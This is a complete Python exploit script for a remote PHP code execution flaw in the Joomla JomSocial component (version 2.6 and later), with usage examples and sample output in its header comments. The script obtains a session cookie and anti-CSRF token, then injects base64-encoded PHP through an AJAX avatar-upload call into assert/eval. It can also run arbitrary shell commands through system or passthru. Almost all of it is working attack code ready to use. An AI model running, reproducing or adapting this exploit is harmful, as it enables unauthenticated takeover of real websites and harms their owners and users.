#
# Joomla! JomSocial component >= 2.6 PHP code execution exploit
#
# Authors:
#   - Matias Fontanini
#   - Gaston Traberg
#
# This exploit allows the execution of PHP code without any prior 
# authentication on the Joomla! JomSocial component.
#
# Note that in order to be able to execute PHP code, both the "eval" 
# and "assert" functions must be enabled. It is also possible to execute
# arbitrary PHP functions, without using them. Therefore, it is possible
# to execute shell commands using "system", "passthru", etc, as long
# as they are enabled.
#
# Examples:
#
# Execute PHP code:
# ./exploit.py -u http://example.com/index.php -p "echo &#039;Hello World!&#039;;"
# ./exploit.py -u http://example.com/index.php -p /tmp/script_to_execute.php
# 
# Execute shell commands(using system()):
# ./exploit.py -u http://example.com/index.php -s "netstat -n"
#
# Exploit shell commands(using a user provided function, passthru in this case)
# ./exploit.py -u http://example.com/joomla/index.php -s "netstat -natp" -c passthru
#
# Exploit execution example:
# $ python exploit.py -u http://example.com/index.php -p &#039;var_dump("Hello World!");&#039;
# [i] Retrieving cookies and anti-CSRF token... Done
# [+] Executing PHP code...
# string(12) "Hello World!"

import urllib, urllib2, re, argparse, sys, os

class Exploit:
    token_request_data = &#039;option=com_community&view=frontpage&#039;
    exploit_request_data = &#039;option=community&no_html=1&task=azrul_ajax&func=photos,ajaxUploadAvatar&{0}=1&arg2=["_d_","Event"]&arg3=["_d_","374"]&arg4=["_d_","{1}"]&#039;
    json_data = &#039;{{"call":["CStringHelper","escape", "{1}","{0}"]}}&#039;
    
    def __init__(self, url, user_agent = None, use_eval = True):
        self.url = url
        self._set_user_agent(user_agent)
        self.use_eval = use_eval
        self.token_regex = re.compile(&#039;<input type=\"hidden\" name=\"([\w\d]{32})\" value=\"1\" \/>&#039;)
        self.cookie, self.token = self._retrieve_token()
        self.result_regex = re.compile(&#039;method=\\\\"POST\\\\" enctype=\\\\"multipart\\\\/form-data\\\\"><br>(.*)<div id=\\\\"avatar-upload\\\\">&#039;, re.DOTALL)
        self.command_regex = re.compile(&#039;(.*)\\[\\["as","ajax_calls","d",""\\]&#039;, re.DOTALL)
    
    def _set_user_agent(self, user_agent):
        self.user_agent = user_agent
    
    def _make_opener(self, add_cookie = True):
        opener = urllib2.build_opener()
        if add_cookie:
            opener.addheaders.append((&#039;Cookie&#039;, self.cookie))
        opener.addheaders.append((&#039;Referer&#039;, self.url))
        if self.user_agent:
            opener.addheaders.append((&#039;User-Agent&#039;, self.user_agent))
        return opener
    
    def _retrieve_token(self):
        opener = self._make_opener(False)
        sys.stdout.write(&#039;[i] Retrieving cookies and anti-CSRF token... &#039;)
        sys.stdout.flush()
        req = opener.open(self.url, Exploit.token_request_data)
        data = req.read()
        token = self.token_regex.findall(data)
        if len(token) < 1:
            print &#039;Failed&#039;
            raise Exception("Could not retrieve anti-CSRF token")
        print &#039;Done&#039;
        return (req.headers[&#039;Set-Cookie&#039;], token[0])

    def _do_call_function(self, function, parameter):
        parameter = parameter.replace(&#039;"&#039;, &#039;\\"&#039;)
        json_data = Exploit.json_data.format(function, parameter)
        json_data = urllib2.quote(json_data)
        data = Exploit.exploit_request_data.format(self.token, json_data)
        opener = self._make_opener()
        req = opener.open(self.url, data)
        if function == &#039;assert&#039;:
            return req.read()
        elif function in [&#039;system&#039;, &#039;passthru&#039;]:
            result = self.command_regex.findall(req.read())
            if len(result) == 1:
                return result[0]
            else:
                return "[+] Error executing command."
        else:
            result = self.result_regex.findall(req.read())
            if len(result) == 1:
                return result[0].replace(&#039;\\/&#039;, &#039;/&#039;).replace(&#039;\\"&#039;, &#039;"&#039;).replace(&#039;\\n&#039;, &#039;\n&#039;)
            else:
                return "[+] Error executing command."
    
    def call_function(self, function, parameter):
        if self.use_eval:
            return self.eval("echo {0}(&#039;{1}&#039;)".format(function, parameter))
        else:
            return self._do_call_function(function, parameter)
    
    def disabled_functions(self):
        return self.call_function("ini_get", "disable_functions")

    def test_injection(self):
        result = self.eval("echo &#039;HELLO&#039; . &#039; - &#039; . &#039;WORLD&#039;;")
        if &#039;HELLO - WORLD&#039; in result:
            print "[+] Code injection using eval works"
        else:
            print "[+] Code injection doesn&#039;t work. Try executing shell commands."

    def eval(self, code):
        if code [-1] != &#039;;&#039;:
            code = code + &#039;;&#039;
        return self._do_call_function(&#039;assert&#039;, "@exit(@eval(@base64_decode(&#039;{0}&#039;)));".format(code.encode(&#039;base64&#039;).replace(&#039;\n&#039;, &#039;&#039;)))
    


parser = argparse.ArgumentParser(
    description="JomSocial >= 2.6 - Code execution exploit"
)
parser.add_argument(&#039;-u&#039;, &#039;--url&#039;, help=&#039;the base URL&#039;, required=True)
parser.add_argument(
    &#039;-p&#039;, 
    &#039;--php-code&#039;, 
    help=&#039;the PHP code to execute. Use \&#039;-\&#039; to read from stdin, or provide a file path to read from&#039;)
parser.add_argument(&#039;-s&#039;, &#039;--shell-command&#039;, help=&#039;the shell command to execute&#039;)
parser.add_argument(&#039;-c&#039;, &#039;--shell-function&#039;, help=&#039;the PHP function to use when executing shell commands&#039;, default="system")
parser.add_argument(&#039;-t&#039;, &#039;--test&#039;, action=&#039;store_true&#039;, help=&#039;test the PHP code injection using eval&#039;, default=False)
parser.add_argument(&#039;-n&#039;, &#039;--no-eval&#039;, action=&#039;store_false&#039;, help=&#039;don\&#039;t use eval when executing shell commands&#039;, default=True)

args = parser.parse_args() 
if not args.test and not args.php_code and not args.shell_command:
    print &#039;[-] Need -p, -t or -s to do something...&#039;
    exit(1)
url = args.url
try:
    if not url.startswith(&#039;http://&#039;) and not url.startswith(&#039;https://&#039;):
        url = &#039;http://&#039; + url
    exploit = Exploit(url, use_eval=args.no_eval)
    if args.test:
        exploit.test_injection()
    elif args.php_code:
        code = args.php_code
        if args.php_code == &#039;-&#039;:
            print &#039;[i] Enter the code to be executed:&#039;
            code = sys.stdin.read()
        elif os.path.isfile(code):
            try:
                fd = open(code)
                code = fd.read()
                fd.close()
            except Exception:
                print "[-] Error reading the file."
                exit(1)
        print &#039;[+] Executing PHP code...&#039;
        print exploit.eval(code)
    elif args.shell_command:
        print exploit.call_function(args.shell_function, args.shell_command)
except Exception as ex:
    print &#039;[+] Error: &#039; + str(ex)

